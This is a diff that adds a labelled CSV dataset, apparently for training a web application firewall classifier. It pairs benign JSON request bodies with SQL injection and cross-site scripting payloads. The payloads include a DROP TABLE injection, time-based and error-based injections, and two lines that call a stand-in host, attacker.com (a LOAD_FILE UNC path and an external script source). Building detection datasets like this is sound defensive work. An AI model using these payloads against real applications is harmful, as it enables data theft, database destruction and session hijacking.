@@ -1,0 +1,76 @@
+payload,label
+"{""user"": ""alice_99"", ""action"": ""view_profile"", ""page"": 1}",Normal
+"{""search"": ""laptop dell xps 15"", ""category"": ""electronics"", ""sort"": ""asc""}",Normal
+"{""email"": ""nguyen.van.a@gmail.com"", ""role"": ""student"", ""status"": ""active""}",Normal
+"{""item_id"": 1024, ""quantity"": 2, ""coupon"": ""SUMMER2026""}",Normal
+"{""title"": ""Báo cáo tiến độ"", ""content"": ""Đã cập nhật hệ thống honeypot.""}",Normal
+"{""username"": ""chinh_nguyen"", ""remember_me"": true, ""device"": ""Windows 11""}",Normal
+"{""filter_by"": ""status"", ""value"": ""completed"", ""limit"": 50}",Normal
+"{""product_name"": ""Bàn phím cơ AKKO"", ""price_range"": [1000000, 2000000]}",Normal
+"{""comment"": ""Bài viết rất hay và hữu ích!"", ""post_id"": 888}",Normal
+"{""settings"": {""theme"": ""dark"", ""notifications"": true, ""language"": ""vi""}}",Normal
+"{""order_id"": ""ORD-2026-9901"", ""payment_method"": ""MOMO""}",Normal
+"{""api_key"": ""abc123xyz890"", ""service"": ""data_sync""}",Normal
+"{""feedback"": ""Giao diện mượt mà, dễ sử dụng."", ""rating"": 5}",Normal
+"{""user_id"": 405, ""avatar_url"": ""https://example.com/avatar.png""}",Normal
+"{""query"": ""thuật toán RandomForest"", ""type"": ""article""}",Normal
+"{""task_name"": ""Huấn luyện mô hình WAF"", ""priority"": ""high""}",Normal
+"{""location"": ""Da Nang"", ""latitude"": 16.0544, ""longitude"": 108.2022}",Normal
+"{""file_name"": ""document_v1.pdf"", ""size_kb"": 2048}",Normal
+"{""tag"": [""security"", ""ai"", ""machine-learning""]}",Normal
+"{""event"": ""user_login"", ""timestamp"": 1772500000}",Normal
+"{""bio"": ""Sinh viên ngành An ninh mạng Đại học Duy Tân""}",Normal
+"{""shipping_address"": ""Cẩm Lệ, Đà Nẵng"", ""phone"": ""0905123456""}",Normal
+"{""message"": ""Chào bạn, mình cần hỗ trợ kỹ thuật.""}",Normal
+"{""course"": ""An toàn thông tin"", ""credit"": 3}",Normal
+"{""metadata"": {""version"": ""1.0.2"", ""env"": ""production""}}",Normal
+"{""username"": ""admin' OR '1'='1"", ""password"": ""123""}",SQLi
+"{""search"": ""laptop' UNION SELECT username, password FROM users--"", ""category"": ""all""}",SQLi
+"{""id"": ""1; DROP TABLE users;--"", ""action"": ""delete""}",SQLi
+"{""query"": ""1' AND 1=1--"", ""filter"": ""active""}",SQLi
+"{""user_id"": ""' OR 1=1 #"", ""token"": ""abc123xyz""}",SQLi
+"{""username"": ""admin'--"", ""password"": ""any_password""}",SQLi
+"{""id"": ""1' AND SLEEP(5)--"", ""action"": ""check""}",SQLi
+"{""search"": ""' UNION SELECT NULL, version(), NULL--"", ""page"": 1}",SQLi
+"{""filter"": ""1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--""}",SQLi
+"{""order_by"": ""id ASC, (SELECT 1 FROM (SELECT SLEEP(5))a)""}",SQLi
+"{""username"": ""\"" OR \""1\""=\""1"", ""password"": ""pass""}",SQLi
+"{""search"": ""' OR username LIKE '%"", ""type"": ""wildcard""}",SQLi
+"{""id"": ""1'/**/OR/**/1=1--"", ""status"": ""test""}",SQLi
+"{""user_id"": ""1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--""}",SQLi
+"{""comment"": ""test' HAVING 1=1--"", ""post_id"": 10}",SQLi
+"{""token"": ""0x27204f5220313d31"", ""type"": ""hex""}",SQLi
+"{""search"": ""' UNION SELECT sqlite_version(), NULL--"", ""source"": ""db""}",SQLi
+"{""user"": ""' OR 'a'='a"", ""login"": ""true""}",SQLi
+"{""id"": ""1' OR ISNULL(1)=0--"", ""mode"": ""strict""}",SQLi
+"{""query"": ""' AND SUBSTRING(version(),1,1)='8'--"", ""check"": ""v8""}",SQLi
+"{""payload"": ""' OR (SELECT LOAD_FILE('\\\\\\\\attacker.com\\\\a'))--""}",SQLi
+"{""user"": ""admin' AND '1'='1"", ""role"": ""admin""}",SQLi
+"{""id"": ""1'||'1'='1"", ""debug"": ""true""}",SQLi
+"{""search"": ""' AND BENCHMARK(5000000,MD5(1))--"", ""speed"": ""slow""}",SQLi
+"{""id"": ""1 AND 1=(SELECT COUNT(*) FROM users)"", ""type"": ""subquery""}",SQLi
+"{""comment"": ""<script>alert('XSS')</script>"", ""post_id"": 101}",XSS
+"{""username"": ""<img src=x onerror=alert(document.cookie)>"", ""bio"": ""hello""}",XSS
+"{""search"": ""<svg/onload=alert(1)>"", ""page"": 1}",XSS
+"{""profile_name"": ""javascript:alert('XSS')"", ""status"": ""updating""}",XSS
+"{""feedback"": ""<body onload=alert('XSS')>"", ""rating"": 5}",XSS
+"{""input"": ""<input autofocus onfocus=alert(1)>"", ""form"": ""login""}",XSS
+"{""comment"": ""<details open ontoggle=alert(1)>"", ""post_id"": 200}",XSS
+"{""url"": ""<iframe src=\""javascript:alert(1)\""></iframe>""}",XSS
+"{""audio"": ""<audio src=x onerror=alert(1)>"", ""type"": ""sound""}",XSS
+"{""video"": ""<video><source onerror=alert(1)></video>""}",XSS
+"{""select"": ""<select autofocus onfocus=alert(1)></select>""}",XSS
+"{""script"": ""<script src=\""http://attacker.com/xss.js\""></script>""}",XSS
+"{""svg"": ""<svg><animate onend=alert(1) attributeName=x dur=1s>""}",XSS
+"{""obfuscated"": ""<iMg sRc=x oNeRroR=alert(1)>"", ""tag"": ""test""}",XSS
+"{""encoded"": ""\\u003cscript\\u003ealert(1)\\u003c/script\\u003e""}",XSS
+"{""style"": ""<div style=\""background-image: url(javascript:alert(1))\"">""}",XSS
+"{""math"": ""<math><maction actiontype=\""statusline\"" xlink:href=\""javascript:alert(1)\"">click</maction></math>""}",XSS
+"{""comment"": ""<script>prompt(1)</script>"", ""status"": ""pending""}",XSS
+"{""bio"": ""<script>confirm(document.domain)</script>""}",XSS
+"{""object"": ""<object data=\""javascript:alert(1)\"">""}",XSS
+"{""embed"": ""<embed src=\""javascript:alert(1)\"">""}",XSS
+"{""eval"": ""<script>eval(atob('YWxlcnQoMSk='))</script>""}",XSS
+"{""link"": ""<a href=\""#\"" onmouseover=alert(1)>Hover me</a>""}",XSS
+"{""img"": ""<img src=a onerror=confirm(1)>"", ""alt"": ""image""}",XSS
+"{""marquee"": ""<marquee onstart=alert(1)>Alert XSS</marquee>""}",XSS
